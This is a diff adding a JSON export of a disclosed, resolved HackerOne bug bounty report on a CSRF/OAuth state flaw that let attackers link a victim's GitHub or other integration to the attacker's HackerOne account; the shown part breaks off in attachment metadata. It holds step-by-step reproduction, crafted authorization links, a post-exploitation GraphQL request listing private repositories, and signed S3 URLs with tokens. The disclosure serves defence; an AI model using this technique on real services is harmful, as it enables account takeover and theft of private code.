@@ -1,0 +1,1126 @@
+{
+  "id": 1727221,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzI3MjIx",
+  "url": "https://hackerone.com/reports/1727221",
+  "title": "Improper CSRF token validation allows attackers to access victim's accounts linked to Hackerone",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-10-08T11:11:49.623Z",
+  "submitted_at": "2022-10-08T11:11:49.758Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "medmahmoudi",
+    "url": "/medmahmoudi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-06-19T20:15:24.936Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-06-19T20:15:24.808Z",
+  "team_member_agreed_on_going_public_at": "2023-06-19T14:44:08.047Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Overview:\n\nOrganisations in Hackerone can automate their workflow by integrating their accounts with their existing tools like Github or Jira. Most of these integrations are built on top of Tray.io's embedded product.\n\nAccording to this [article](https://tray.io/customers/story/hackerone). Hackerone has established Tray Embedded as central integration hub to deliver high-quality customer integration.\n\n### Flawed Authorization flow\n\nI have created two sandbox Hackerone accounts and picked the github integration for testing. This [link](https://docs.hackerone.com/programs/github-integration.html) explains very well how to setup the integration on your account.\n\nWhen we click on \"New Authentication\", an exchange starts between Hackeron's integration authentication server and the service provider. \n\n{F1976245}\n\nThe authentication integration server is ```hackerone.integration-authentication.com```. The following are steps of the authorization flow:\n\n1. The flow starts with a POST request to\n```hackerone.integration-authentication.com/session```\n\n {F1976252}\n\nThe response contains two tokens: ***session*** and ***csrf***. \n\n2. The frontend takes those values and uses them to send a request to the oauth2 endpoint to generate the authorization link.\n\n```\nhttps://hackerone.integration-authentication.com/oauth2/auth/:authentication_id?csrf=QDXo8g3vciWTiV9Mm1L-VpYl6hKQCE-4ORmMFliZNh8=&scope=read:org%20repo&session=78NgOnCMPISn0LPw4Zto5HFSRLJwJyLaJqqi6_bFmXU=\n```\n\n {F1976253}\n\n3. Following the redirection takes us to the authorization page of the service provider\n\n {F1976255}\n\nIf we choose to Authorize Hackerone, we will get redirected to the token callback endpoint:\n```\nhackerone.integration-authentication.com/oauth2/token?code=47b070b577c905d66124&state=507dad3e-aa80-4fee-8ec1-a04ad95aea83%2CQDXo8g3vciWTiV9Mm1L-VpYl6hKQCE-4ORmMFliZNh8%3D%2C%2Chackerone.integration-configuration.com%2Cproduction%2C78NgOnCMPISn0LPw4Zto5HFSRLJwJyLaJqqi6_bFmXU%3D\n```\n \n\nThis endpoint validates the code received from Github, the backend relies on the ***state*** parameter to determine to which user should the Github access token be appropriated. Then it redirects us to the callback endpoint ```https://hackerone.integration-configuration.com/auth/cb?id=507dad3e-aa80-4fee-8ec1-a04ad95aea83``` which sends a postmessage to the embedded iframe to validate the integration on the client side.\n\nBy analyzing these requests, I found that step 2 was not well protected against cross site forgery attacks. The unproper validation of the CSRF token puts all Hackerone's customers at a big risk. With one click from the victim, the attacker couldtrick the victim to link their Github(or any other integration built on top of Tray.io) to the attacker's account.\n\n### POC:\n{F1976267}\n\n\n### Reproduction Steps:\n. Attacker creates a program then starts setting up a an integration(for example Github)\n\n. Attacker keeps forwarding requests until a GET request similar to\n\n```\nhttps://hackerone.integration-authentication.com/oauth2/auth/<Auth ID>?csrf=F_Sr5vd7hWMLSkZoubYOTMbwROI922ZU6q1S4fEF43E=&scope=read:org%20repo&session=1iydW3sIKpyTGxhG8lxeWY9ddzaUknoUJT9Rr51ptMc=\n```\n\n. Attacker copies the request's url then drops it. He then sends it to the victim and hopes for the best\n\n. Victim clicks on the link\n\nTwo options:\n1. if the victim has already linked the company's Github to the Hackerone. Github won't ask for user's conscent. The victim would be redirected the callback endpoint\n\n```\nhttps://hackerone.integration-configuration.com/auth/cb?id=<Auth ID>\n```\n\nThe victim would have no idea of what happened\n\n2. The app would ask the user if they'd give their conscent to Hackerone. If the victim trusts Hackerone, there is a high chance they would click Yes.\n\n. Once the victim's authorization is finished. The attacker can change the location of authentication window to \n\n```\nhttps://hackerone.integration-configuration.com/auth/cb?id=<Auth ID>\n```\n\nThis step is just to convince the frontend that the authorization has successfully finished.\nThe victim's account is linked to the attacker's account now. Depending on the scope of each integration, there is a wide variety of post exploitation scenarios the attackers could use.\n\n## Impact\n\nOnce the victim's app is connected to the attacker's hackerone account, there are a lot of post exploitation scenarios an attacker can use. The tray's graphql basically gives the attacker the option to make unauthorized arbitrary calls to the API of the application is question. What makes this vulnerability critical is that it could be reproduced on multiple integrations.\n\nWhat an attacker could do for example is prepare a list of exploit links and prepares a javascript code that opens all the links is seperate windows. Each link would try taking over a specific integration. This way, the attacker could take multiple integrations at once with one user click.\n\n### Post Exploitation:\n\nOne of those options is using the Tray.io's graphql. Tray.io has a graphql for its customers that takes care of requesting the integration API's for them.\n \nFor example, the query to fetch the the victim's github repositories, including the private ones is similar to this one:\n\n```\nPOST /graphql HTTP/2\nHost: tray.io\nContent-Length: 512\nSec-Ch-Ua: \"Not;A=Brand\";v=\"99\", \"Chromium\";v=\"106\"\nAccept: */*\nContent-Type: application/json\nSec-Ch-Ua-Mobile: ?0\nAuthorization: Bearer aad14176400b44bb97b703b4ae1077a5c84c3b7f97e34f5383643c1c8a22cdf4\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36\nSec-Ch-Ua-Platform: \"Windows\"\nOrigin: https://hackerone.integration-configuration.com\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://hackerone.integration-configuration.com/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\n{\"operationName\":\"CallConnector\",\"variables\":{\"input\":{\"connector\":\"github\",\"version\":\"2.2\",\"operation\":\"raw_http_request\",\"authId\":\"22583997-4aa0-4bb8-87cb-28326dc97868\",\"input\":\"{\\\"method\\\":\\\"GET\\\",\\\"parse_response\\\":\\\"true\\\",\\\"include_raw_body\\\":\\\"false\\\",\\\"url\\\":{\\\"endpoint\\\":\\\"/user/repos?per_page=50&page=1&affiliation=owner%2Ccollaborator%2Corganization_member\\\"}}\"}},\"query\":\"mutation CallConnector($input: ConnectorCallInput!) {\\n  callConnector(input: $input) {\\n    output\\n    __typename\\n  }\\n}\\n\"}\n```",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1976245,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4sgfldlfkovrow7p3kvfv76mruwz?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065446Z&X-Amz-Expires=2815&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=eb6cc6dcbbb4dc7e4b25f4dde079e96acfc1f6883caf8f8e0cfaca80772d52b5",
+      "file_size": 12105,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1976252,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/133t2uxs3ux4u5xoz3gi4imyrhw2?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065446Z&X-Amz-Expires=2815&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=be980f2b58e2dd3b1316844b7395b55345767e4caf22a6b4de24cad793de69f2",
+      "file_size": 160178,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1976253,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1xnwz7fv50mcgw4d8wlkufhelt0f?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065446Z&X-Amz-Expires=2815&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a4a419c7bf578504ca5da93c0cdb8bd3f2f93b39156345486f256b896cba816b",
+      "file_size": 177486,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1976255,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vaa2bc7ri6op2ics1rp8s7lfnl1x?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065446Z&X-Amz-Expires=2815&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fed1bb1e020b4013001683876ab49090e4e8ab6923af1fe3192675ab906e188d",
+      "file_size": 84513,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1976267,
+      "file_name": "PoC_Hackerone.webm",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cwvt8etlwu8xmh461pkf1z3sf2z4?response-content-disposition=attachment%3B%20filename%3D%22PoC_Hackerone.webm%22%3B%20filename%2A%3DUTF-8%27%27PoC_Hackerone.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065446Z&X-Amz-Expires=2815&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=58735eaba12a201d8c33ce3d459f01121a9456ba5e10af91bb2a77057599fcd3",
+      "file_size": 60978525,
+      "type": "video/webm",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-07-19T14:44:08.145Z",
+  "allow_singular_disclosure_after": -5674238.070653188,
+  "singular_disclosure_allowed": true,
+  "vote_count": 142,
+  "voters": [
+    "kathulu",
+    "mokusou",
+    "shishtawy_sec",
+    "zzero",
+    "luakt",
+    "abdallah_samir",
+    "rogue_1",
+    "cucumbersalad",
+    "david96",
+    "ejc",
+    "and 132 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.4,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 3,
+    "asset_type": "URL",
+    "asset_identifier": "hackerone.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 18774037,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Hi @medmahmoudi,\n\nThank you for your submission. I hope you are well. \n\nWould you elaborate further on your following statement: \n> By analyzing these requests, I found that step 2 was not well protected against cross site forgery attacks. The unproper validation of the CSRF token puts all Hackerone's customers at a big risk. With one click from the victim, the attacker couldtrick the victim to link their Github(or any other integration built on top of Tray.io) to the attacker's account.\n\nKind regards,\n@h1_analyst_magnus",
+      "automated_response": false,
+      "created_at": "2022-10-13T16:33:19.424Z",
+      "updated_at": "2022-10-13T16:33:19.424Z",
+      "actor": {
+        "username": "h1_analyst_magnus",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_magnus",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/oh5rnn06wtaj1jegmqf5omn4hyu9/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 18789744,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "While integrating an application in hackerone. I noticed that the requests sent from my browser to ```hackerone.integration-authentication.com``` contained a Bearer token. Notice how the requests to the ```/sesssion``` endpoint has this token:\n{F1986032}\n\nWhile the request to the OAuth2 token endpoint does not:\n\n{F1986036}\n\nThis caught my attention. I know that the backend uses the code to retrieve the access token from the service provider. But how does the application know to which user should the access token be labeled if the request is unauthenticated ?\n\n### State parameter\n\nThe backend actually only relies on the ***state*** parameter to identify the users. Which means if the Lucie's Oauth code is used with Eve's state, Lucie's access token would be labeled with Lucie's account. \n\n```\nhackerone.integration-authentication.com/oauth2/token?code=<Victim Code>&state=<Attacker's State>\n```\n\n### Generating the state\n\nThe state contains the following strings: Authentication ID, CSRF token, frontEndDomain, environment, session. The dynamic parts are Authentication ID, CSRF and Session.\n\n{F1986093}\n\nThe request to generate a state is the following:\n\n{F1986056}\n\nThe absence of the Bearer token on this request looked juicy.\n\nIf the attacker creates a new authentication, intercepts this request then sends it to the victim in the form of a link. It does not matter who created the authentication in the first place. Upon clicking on the link, the victim would be redirected to github's Oauth page. The state parameter would contain ***the attacker's session and csrf token***.\nAfter the authentication, Github would redirect us to:\n\n```\nhackerone.integration-authentication.com/oauth2/token?code=<Victim Code>&state=<Attacker's State>\n```\n\nI think the backend first uses the code to request the access token from Github. Once the access token is here, it decodes the state. It checks if the Session and the CSRF match the Session and CSRF of the creator of the authentication. Which would be true in this case since the state contains the attacker aka the authentication creator's tokens.  \n\n### Remediation\nI think the request to the OAuth2 token endpoint need to authenticated.\n\nPlease let me know if you have more questions :) \n",
+      "automated_response": false,
+      "created_at": "2022-10-14T15:38:06.284Z",
+      "updated_at": "2022-10-14T15:38:06.284Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1986093,
+          "filename": "image.png",
+          "type": "image/png",
